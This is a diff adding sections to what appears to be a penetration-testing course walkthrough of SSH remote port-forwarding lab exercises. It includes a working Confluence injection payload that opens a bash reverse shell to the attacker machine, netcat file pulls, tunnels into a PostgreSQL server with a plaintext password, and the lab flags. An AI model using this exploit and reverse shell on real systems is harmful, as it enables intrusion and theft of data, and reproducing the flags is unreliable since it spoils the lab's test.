@@ -358,7 +358,7 @@ chmod +x ssh_local_client
 	Flag: "OS{0ccdf0d584981c5fd0061c873fc7be2d}"
 ```
 
-## Dynamic
+## Local Dynamic
 
 1. Follow this walkthrough, and scan HRSHARES from the Kali machine using Nmap and Proxychains. What port between 4800 and 4900 is open?
 
@@ -474,4 +474,114 @@ proxychains ./ssh_dynamic_client -i 172.16.233.217 -p 4872
 
 
 ## Remote
+
+1. Start VM Group 1 and follow the example from this section. What's the value of the flag found in the **hr_backup** database **payroll** table?
+
+- Use CVE to gain remote shell on CONFLUENCE01 and upgrade to TTY
+```bash
+# Tab 1 - Listener
+nc -nlvp 1270
+
+# Tab 2
+curl -v http://192.168.193.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.196/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Tab 1 - CONFLUENCE01
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+- Set up Remote Port Forward
+```bash
+# CONFLUENCE01
+ssh -N -R 127.0.0.1:2345:10.4.193.215:5432 kali@192.168.118.4
+	Could not create directory '/home/confluence/.ssh'.
+	The authenticity of host '192.168.45.196 (192.168.45.196)' can''t be established.
+	ECDSA key fingerprint is SHA256:Z6AWTPQLtEMVjOkkRmrchK5U1cx9L6Dek+5Gx8+icic.
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	yes
+	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+	kali@192.168.45.196''s password:
+```
+
+- Log into PGDATABASE01 through Remote SSH Tunnel
+```bash
+# kali
+psql -h 127.0.0.1 -p 2345 -U postgres
+	Password for user postgres: (D@t4basePassw0rd!)
+	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+	Type "help" for help.
+
+postgres=# \l
+	                                                        List of databases
+	    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges
+	------------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
+	 confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           |
+	 hr_backup  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           |
+	 postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           |
+	 template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
+	            |          |          |                 |             |             |            |           | postgres=CTc/postgres
+	 template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
+	            |          |          |                 |             |             |            |           | postgres=CTc/postgres
+	(5 rows)
+
+postgres=# \c hr_backup
+	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+	You are now connected to database "hr_backup" as user "postgres".
+
+hr_backup=# SELECT * FROM payroll;
+	 id |                 flag             
+	----+--------------------------------------
+	  0 | OS{5a80ecbf77134685ac792e909f2737aa}
+	(1 row)
+```
+
+
+
+3. Start VM Group 2. Download the binary at **ssh_remote_client** from the CONFLUENCE01 web server at **http://CONFLUENCE01:8090/exercises/ssh_remote_client**. Create an SSH remote port forward on CONFLUENCE01 that allows you to run the binary against port 4444 on PGDATABASE01 from your Kali machine.
+
+	Note: the source files used to build the **ssh_remote_client** binary can be downloaded from **/exercises/client_source.zip**.
+
+- Use CVE to gain remote shell on CONFLUENCE01 and upgrade to TTY
+- Download binary & test
+```bash
+# Tab Kali
+nc -nlvp 3333 > ssh_remote_client
+
+# Tab CONFLUENCE01
+nc 192.168.45.196 3333 -q 1 < ../confluence/exercises/ssh_remote_client
+
+# Tab Kali (after download)
+chmod +x ssh_remote_client
+
+./ssh_remote_client 
+	Connecting to 127.0.0.1:4141
+	thread 'main' panicked at 'Failed to connect to 127.0.0.1:4141: Connection refused (os error 111)', src/client.rs:79:13
+	note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
+```
+
+- Start Remote SSH Tunnel & exploit
+```bash
+# CONFLUENCE01
+ssh -N -R 127.0.0.1:4141:10.4.193.215:5432 kali@192.168.45.196
+	Could not create directory '/home/confluence/.ssh'.
+	The authenticity of host '192.168.45.196 (192.168.45.196)' can't be established.
+	ECDSA key fingerprint is SHA256:Z6AWTPQLtEMVjOkkRmrchK5U1cx9L6Dek+5Gx8+icic.
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	yes
+	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+	kali@192.168.45.196's password:
+
+
+# Kali
+./ssh_remote_client 
+	Connecting to 127.0.0.1:4141
+	Flag: "OS{6650a40c7f5841a75a01cfce295c5915}"
+```
+
+
+
+## Remote Dynamic
+
+
 
